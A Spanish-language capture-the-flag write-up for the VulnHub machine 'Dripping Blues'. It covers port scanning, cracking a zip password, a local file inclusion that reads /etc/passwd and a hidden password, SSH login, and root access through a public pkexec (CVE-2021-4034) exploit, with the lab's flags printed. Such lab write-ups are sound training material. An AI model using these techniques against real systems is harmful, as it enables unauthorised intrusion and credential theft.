---
icon: flag
---

# Dripping\_blues VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 07:58 EDT
Nmap scan report for 192.168.5.189
Host is up (0.0059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:2A:B7:19 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

### ftp

```shell
ftp anonymous@<IP>
```

Dentro del mismo puerto encontraremos el siguiente archivo y nos lo descargaremos...

```shell
get respectmydrip.zip
```

Si intentamos descomprimir ese archivo pedira contraseña, por lo que haremos lo siguiente...

```shell
zip2john respectmydrip.zip > hash
```

Info:

```
respectmydrip.zip/respectmydrip.txt:$pkzip$1*1*2*0*20*14*5c92f12b*0*2f*0*20*5c92*2678f9b06d95fb83a5b2029eac5970991997871b858a64a8ea2f30b929d2b33d*$/pkzip$:respectmydrip.txt:respectmydrip.zip::respectmydrip.zip
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
072528035        (respectmydrip.zip/respectmydrip.txt)     
1g 0:00:00:01 DONE (2024-06-15 08:58) 0.7518g/s 10470Kp/s 10470Kc/s 10470KC/s 0744255931..0713932315
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Por lo que la contraseña sera `072528035`...

```shell
unzip respectmydrip.zip
```

Metemos esa contraseña y nos dara otro `.zip` con contraseña y un archivo llamado `respectmydrip.txt` que si lo leemos...

```
just focus on "drip"
```

### Gobuster

```shell
gobuster dir -u http://<IP> -w <WORDLIST> -x html,php,txt,md -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.189
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,md
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.md         (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.md         (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 138]
/robots.txt           (Status: 200) [Size: 78]
/robots.txt           (Status: 200) [Size: 78]
/server-status        (Status: 403) [Size: 278]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

Dentro del `/robots.txt` veremos lo siguiente...

```
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```

Dentro de la siguiente `URL` veremos lo siguiente...

```
URL = http://<IP>/dripisreal.txt
```

Veremos lo siguiente...

```
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh
```

Si vamos a esa `URL` veremos la letra de la cancion y si seguimos las instrucciones para sacar la contraseña quedaria algo tal que asi...

```
50a98ad7faf439a039f0cd05b3a1137b
```

Pero no nos servira de mucho, si vemos mejor el archivo llamado `respectmydrip.txt` vemos que indica un paraemtro `drip` por lo que si lo ponemos en la `URL` con el `index.php` y lo utilizamos como parametro para poner lo que encontramos en el `robots.txt` veremos lo siguiente...

```
URL = http://<IP>/index.php?drip=/etc/dripispowerful.html
```

Y si inspeccionamos el codigo veremos lo siguiente...

```
password is:
imdrippinbiatch
```

Y si probamos con el usuario que aparece en la pagina principal llamado `thugger`...

Igualmente si intentamos ver el `/etc/passwd` lo podremos ver y ahi podremos confirmar que esta ese usuario...

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
thugger:x:1001:1001:,,,:/home/thugger:/bin/bash
sshd:x:126:65534::/run/sshd:/usr/sbin/nologin
mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:128:134:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
User = thugger
Password = imdrippinbiatch
```

```shell
ssh thugger@<IP>
```

Veremos que si funciona y nos metera dentro como el usuario `thugger`...

Una vez estando dentro leeremos la flag...

> user.txt (flag1)

```
5C50FC503A2ABE93B4C5EE3425496521
```

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
     882     72 -rwsr-xr-x   1 root     root        72712 Şub  6 15:54 /snap/core22/1380/usr/bin/chfn
      888     44 -rwsr-xr-x   1 root     root        44808 Şub  6 15:54 /snap/core22/1380/usr/bin/chsh
      954     71 -rwsr-xr-x   1 root     root        72072 Şub  6 15:54 /snap/core22/1380/usr/bin/gpasswd
     1038     47 -rwsr-xr-x   1 root     root        47488 Mar 22 15:25 /snap/core22/1380/usr/bin/mount
     1047     40 -rwsr-xr-x   1 root     root        40496 Şub  6 15:54 /snap/core22/1380/usr/bin/newgrp
     1062     59 -rwsr-xr-x   1 root     root        59976 Şub  6 15:54 /snap/core22/1380/usr/bin/passwd
     1180     55 -rwsr-xr-x   1 root     root        55680 Mar 22 15:25 /snap/core22/1380/usr/bin/su
     1181    227 -rwsr-xr-x   1 root     root       232416 Nis  3  2023 /snap/core22/1380/usr/bin/sudo
     1241     35 -rwsr-xr-x   1 root     root        35200 Mar 22 15:25 /snap/core22/1380/usr/bin/umount
     1333     35 -rwsr-xr--   1 root     systemd-resolve    35112 Eki 25  2022 /snap/core22/1380/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2602    331 -rwsr-xr-x   1 root     root              338536 Oca  2 19:54 /snap/core22/1380/usr/lib/openssh/ssh-keysign
     8632     19 -rwsr-xr-x   1 root     root               18736 Şub 26  2022 /snap/core22/1380/usr/libexec/polkit-agent-helper-1
      293    133 -rwsr-xr-x   1 root     root              135960 Nis 24 19:45 /snap/snapd/21759/usr/lib/snapd/snap-confine
       56     43 -rwsr-xr-x   1 root     root               43088 Eyl 16  2020 /snap/core18/2823/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Haz 28  2019 /snap/core18/2823/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Kas 29  2022 /snap/core18/2823/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Eyl 16  2020 /snap/core18/2823/bin/umount
     1754     75 -rwsr-xr-x   1 root     root               76496 Kas 29  2022 /snap/core18/2823/usr/bin/chfn
     1756     44 -rwsr-xr-x   1 root     root               44528 Kas 29  2022 /snap/core18/2823/usr/bin/chsh
     1809     75 -rwsr-xr-x   1 root     root               75824 Kas 29  2022 /snap/core18/2823/usr/bin/gpasswd
     1873     40 -rwsr-xr-x   1 root     root               40344 Kas 29  2022 /snap/core18/2823/usr/bin/newgrp
     1886     59 -rwsr-xr-x   1 root     root               59640 Kas 29  2022 /snap/core18/2823/usr/bin/passwd
     1977    146 -rwsr-xr-x   1 root     root              149080 Nis  4  2023 /snap/core18/2823/usr/bin/sudo
     2065     42 -rwsr-xr--   1 root     systemd-resolve    42992 Eki 25  2022 /snap/core18/2823/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2375    427 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /snap/core18/2823/usr/lib/openssh/ssh-keysign
       56     43 -rwsr-xr-x   1 root     root               43088 Eyl 16  2020 /snap/core18/2128/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Haz 28  2019 /snap/core18/2128/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/2128/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Eyl 16  2020 /snap/core18/2128/bin/umount
     1710     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/2128/usr/bin/chfn
     1712     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/2128/usr/bin/chsh
     1765     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd
     1829     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/2128/usr/bin/newgrp
     1842     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/2128/usr/bin/passwd
     1933    146 -rwsr-xr-x   1 root     root              149080 Oca 19  2021 /snap/core18/2128/usr/bin/sudo
     2020     42 -rwsr-xr--   1 root     systemd-resolve    42992 Haz 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2330    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign
   146826    388 -rwsr-xr--   1 root     dip               395144 Şub 11  2020 /usr/sbin/pppd
   132020     32 -rwsr-xr-x   1 root     root               31032 Ağu 16  2019 /usr/bin/pkexec
   132238     68 -rwsr-xr-x   1 root     root               67816 Nis  2  2020 /usr/bin/su
   132239    164 -rwsr-xr-x   1 root     root              166056 Şub  3  2020 /usr/bin/sudo
   132333     40 -rwsr-xr-x   1 root     root               39144 Nis  2  2020 /usr/bin/umount
   168656     16 -rwsr-xr-x   1 root     root               14728 Mar 17  2021 /usr/bin/vmware-user-suid-wrapper
   131263     84 -rwsr-xr-x   1 root     root               85064 Nis 16  2020 /usr/bin/chfn
   131269     52 -rwsr-xr-x   1 root     root               53040 Nis 16  2020 /usr/bin/chsh
   131528     88 -rwsr-xr-x   1 root     root               88464 Nis 16  2020 /usr/bin/gpasswd
   131966     68 -rwsr-xr-x   1 root     root               68208 Nis 16  2020 /usr/bin/passwd
   131450     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
   131896     44 -rwsr-xr-x   1 root     root               44784 Nis 16  2020 /usr/bin/newgrp
   131861     56 -rwsr-xr-x   1 root     root               55528 Nis  2  2020 /usr/bin/mount
   133249     52 -rwsr-xr--   1 root     messagebus         51344 Ara  7  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   146378     16 -rwsr-sr-x   1 root     root               14488 Nis  6  2020 /usr/lib/xorg/Xorg.wrap
   141170     24 -rwsr-xr-x   1 root     root               22840 Ağu 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   144051    128 -rwsr-xr-x   1 root     root              130120 Nis 10  2020 /usr/lib/snapd/snap-confine
   133542     16 -rwsr-xr-x   1 root     root               14488 Tem  8  2019 /usr/lib/eject/dmcrypt-get-device
   168712    464 -rwsr-xr-x   1 root     root              473576 Tem 23  2021 /usr/lib/openssh/ssh-keysign
```

Vemos la siguiente linea...

```
132020     32 -rwsr-xr-x   1 root     root     31032 Ağu 16  2019 /usr/bin/pkexec
```

Por lo que haremos lo siguiente...

Esto actua como un `/bin/bash` que tiene permisos `SUID`, por lo que haremos lo siguiente...

URL = https://github.com/Almorabea/pkexec-exploit

Esto nos lo llevaremos al servidor victima, ya sea copiando el contenido de `python` o transferirlo con algun comando como `curl` o `wget`, una vez teniendolo dentro...

```shell
chmod +x CVE-2021-4034.py
```

```shell
python3 CVE-2021-4034.py
```

Info:

```
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f66d753a000 at 0x7f66d68739d0>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
root
```

Con esto ya seriamos `root`, por lo que leeremos la flag...

> root.txt (flag2)

```
78CE377EF7F10FF0EDCA63DD60EE63B8
```
